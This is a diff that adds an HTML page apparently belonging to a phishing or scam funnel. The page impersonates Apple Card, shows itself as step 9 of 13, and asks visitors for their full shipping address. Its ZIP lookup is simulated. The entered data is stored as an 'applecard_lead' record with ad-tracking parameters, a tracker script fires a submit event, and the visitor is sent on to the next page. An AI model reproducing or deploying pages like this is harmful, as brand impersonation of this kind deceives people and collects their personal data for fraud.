@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Shipping Address — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--success:#34C759;--surface:#FFFFFF;--error:#FF3B30}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200)}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-step{font-size:0.75rem;color:var(--gray-400);width:40px;text-align:right}
+
+        .progress{height:3px;background:var(--gray-200);position:relative}
+        .progress-bar{height:100%;background:var(--apple-blue);border-radius:2px;transition:width 0.5s ease;width:72%}
+
+        .content{padding:24px 20px}
+        .section-title{font-size:1.125rem;font-weight:700;margin-bottom:4px}
+        .section-desc{font-size:0.8125rem;color:var(--gray-500);margin-bottom:24px;line-height:1.5}
+
+        /* Address icon */
+        .addr-icon{width:64px;height:64px;border-radius:16px;background:linear-gradient(135deg,rgba(0,113,227,0.1),rgba(52,199,89,0.1));display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+        .addr-icon svg{width:28px;height:28px;fill:var(--apple-blue)}
+
+        /* Form */
+        .form-group{margin-bottom:16px;position:relative}
+        .form-label{font-size:0.8125rem;font-weight:600;margin-bottom:6px;display:flex;align-items:center;gap:6px;color:var(--apple-black)}
+        .form-label svg{width:14px;height:14px;fill:var(--gray-400)}
+        .form-input{
+            width:100%;padding:14px 16px;border:1.5px solid var(--gray-200);border-radius:12px;
+            font-size:0.9375rem;font-family:inherit;color:var(--apple-black);
+            background:var(--surface);outline:none;transition:all 0.2s;
+        }
+        .form-input:focus{border-color:var(--apple-blue)}
+        .form-input.error{border-color:var(--error)}
+        .form-input.success{border-color:var(--success)}
+        .form-input::placeholder{color:var(--gray-300)}
+        .form-input:disabled{background:var(--gray-100);color:var(--gray-500)}
+        .form-hint{font-size:0.6875rem;color:var(--gray-400);margin-top:4px}
+        .form-error{font-size:0.6875rem;color:var(--error);margin-top:4px;display:none}
+        .form-row{display:grid;grid-template-columns:1fr 2fr;gap:12px}
+
+        /* ZIP search indicator */
+        .cep-wrapper{position:relative}
+        .cep-loader{position:absolute;right:14px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid var(--gray-200);border-top-color:var(--apple-blue);border-radius:50%;animation:spin 0.6s linear infinite;display:none}
+        .cep-check{position:absolute;right:14px;top:50%;transform:translateY(-50%);display:none}
+        .cep-check svg{width:20px;height:20px;fill:var(--success)}
+
+        /* Address preview card */
+        .addr-preview{padding:14px 16px;background:var(--gray-100);border-radius:14px;margin:16px 0;display:none;border:1px solid var(--gray-200)}
+        .addr-preview.visible{display:block;animation:springIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275)}
+        .addr-preview .ap-row{display:flex;justify-content:space-between;padding:5px 0;font-size:0.8125rem}
+        .addr-preview .ap-label{color:var(--gray-500)}
+        .addr-preview .ap-value{font-weight:600;text-align:right;max-width:60%}
+
+        .submit-btn{
+            width:100%;padding:16px;border:none;border-radius:14px;
+            font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;
+            background:var(--apple-blue);color:#fff;
+            transition:all 0.3s ease;margin-top:8px;
+        }
+        .submit-btn:hover{background:#0077ED}
+        .submit-btn:active{transform:scale(0.98)}
+        .submit-btn:disabled{opacity:0.4;cursor:not-allowed}
+
+        @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
+        @keyframes springIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <div class="nav-title">Shipping Address</div>
+            <div class="nav-step">9/13</div>
+        </div>
+        <div class="progress"><div class="progress-bar"></div></div>
+
+        <div class="content">
+            <div class="addr-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </div>
+            <div class="section-title" style="text-align:center">Where should we send your Apple Card?</div>
+            <div class="section-desc" style="text-align:center">Enter the address where you'd like to receive your physical titanium card.</div>
+
+            <div class="form-group cep-wrapper">
+                <div class="form-label">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
+                    ZIP Code
+                </div>
+                <input type="tel" class="form-input" id="cep" placeholder="XXXXX" maxlength="10" oninput="maskCep(this);autoSearchCep()">
+                <div class="cep-loader" id="cepLoader"></div>
+                <div class="cep-check" id="cepCheck"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
+                <div class="form-hint">Enter your ZIP Code to continue</div>
+                <div class="form-error" id="cepError">Invalid ZIP code. Please check and try again.</div>
+            </div>
+
+            <div id="addressFields" style="display:none">
+                <div class="form-group">
+                    <div class="form-label">Street address</div>
+                    <input type="text" class="form-input" id="rua" placeholder="Street, Ave...">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <div class="form-label">Number</div>
+                        <input type="tel" class="form-input" id="numero" placeholder="No." oninput="validateForm()">
+                    </div>
+                    <div class="form-group">
+                        <div class="form-label">Apt / Suite</div>
+                        <input type="text" class="form-input" id="complemento" placeholder="Apt, Unit...">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">Neighborhood</div>
+                    <input type="text" class="form-input" id="bairro" placeholder="Neighborhood">
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <div class="form-label">State</div>
+                        <input type="text" class="form-input" id="uf" placeholder="State">
+                    </div>
+                    <div class="form-group">
+                        <div class="form-label">City</div>
+                        <input type="text" class="form-input" id="cidade" placeholder="City">
+                    </div>
+                </div>
+
+                <div class="addr-preview" id="addrPreview">
+                    <div class="ap-row"><span class="ap-label">Address</span><span class="ap-value" id="prevRua">—</span></div>
+                    <div class="ap-row"><span class="ap-label">Neighborhood</span><span class="ap-value" id="prevBairro">—</span></div>
+                    <div class="ap-row"><span class="ap-label">City / State</span><span class="ap-value" id="prevCidade">—</span></div>
+                    <div class="ap-row"><span class="ap-label">ZIP Code</span><span class="ap-value" id="prevCep">—</span></div>
+                </div>
+
+                <button class="submit-btn" id="submitBtn" onclick="window.submitForm()" disabled>Confirm address</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+        LeadData.update({ page: 'cep' });
+
+        let cepTimer = null;
+        let cepFound = false;
+
+        function maskCep(input){
+            // US ZIP: 5 digits or 5+4 (ZIP+4) format
+            let v = input.value.replace(/\D/g,'');
+            if(v.length>9) v=v.slice(0,9);
+            if(v.length>5) v=v.slice(0,5)+'-'+v.slice(5);
+            input.value=v;
+        }
+
+        function autoSearchCep(){
+            clearTimeout(cepTimer);
+            const cep = document.getElementById('cep').value.replace(/\D/g,'');
+            if(cep.length>=5){
+                cepTimer = setTimeout(()=>searchCep(cep),300);
+            } else {
+                resetCepState();
+            }
+        }
+
+        function resetCepState(){
+            document.getElementById('cepLoader').style.display='none';
+            document.getElementById('cepCheck').style.display='none';
+            document.getElementById('cepError').style.display='none';
+            document.getElementById('cep').classList.remove('error','success');
+            document.getElementById('addressFields').style.display='none';
+            cepFound = false;
+        }
+
+        function searchCep(cep){
+            const loader = document.getElementById('cepLoader');
+            const check = document.getElementById('cepCheck');
+            const errorEl = document.getElementById('cepError');
+            const cepInput = document.getElementById('cep');
+
+            loader.style.display='block';
+            check.style.display='none';
+            errorEl.style.display='none';
+            cepInput.classList.remove('error','success');
+
+            // Simulate brief lookup, then reveal manual entry fields
+            setTimeout(()=>{
+                loader.style.display='none';
+                cepInput.classList.add('success');
+                check.style.display='block';
+                cepFound = true;
+
+                document.getElementById('addressFields').style.display='block';
+
+                // Focus street field for manual entry
+                setTimeout(()=>document.getElementById('rua').focus(),200);
+
+                updatePreview();
+                validateForm();
+            }, 400);
+        }
+
+        function updatePreview(){
+            const rua = document.getElementById('rua').value;
+            const numero = document.getElementById('numero').value;
+            const comp = document.getElementById('complemento').value;
+            const bairro = document.getElementById('bairro').value;
+            const cidade = document.getElementById('cidade').value;
+            const uf = document.getElementById('uf').value;
+            const cep = document.getElementById('cep').value;
+
+            let fullAddr = numero ? `${numero} ${rua}` : rua;
+            if(comp) fullAddr += `, ${comp}`;
+
+            document.getElementById('prevRua').textContent = fullAddr || '—';
+            document.getElementById('prevBairro').textContent = bairro || '—';
+            document.getElementById('prevCidade').textContent = (cidade || uf) ? `${cidade}, ${uf}` : '—';
+            document.getElementById('prevCep').textContent = cep || '—';
+
+            const preview = document.getElementById('addrPreview');
+            if(numero && rua){
+                preview.classList.add('visible');
+            }
+        }
+
+        function validateForm(){
+            updatePreview();
+            const rua = document.getElementById('rua').value.trim();
+            const numero = document.getElementById('numero').value.trim();
+            const cidade = document.getElementById('cidade').value.trim();
+            const uf = document.getElementById('uf').value.trim();
+            document.getElementById('submitBtn').disabled = !(cepFound && rua && numero && cidade && uf);
+        }
+
+        // Add input listeners for live preview
+        ['rua','numero','complemento','bairro','cidade','uf'].forEach(id=>{
+            document.getElementById(id).addEventListener('input', validateForm);
+        });
+
+        window.submitForm = function(){
+            const addr = {
+                codigo_postal: document.getElementById('cep').value,
+                rua: document.getElementById('rua').value,
+                numero: document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                freguesia: document.getElementById('bairro').value,
+                localidade: document.getElementById('cidade').value,
+                distrito: document.getElementById('uf').value,
+                morada_completed: true
+            };
+            LeadData.update(addr);
+            if (window.track) window.track('SubmitForm', { form: 'address', content_id: 'apple-card-us', currency: 'USD' });
+            window.location.href = buildUrl('configurando.html');
+        }
+    </script>
+</body>
+</html>
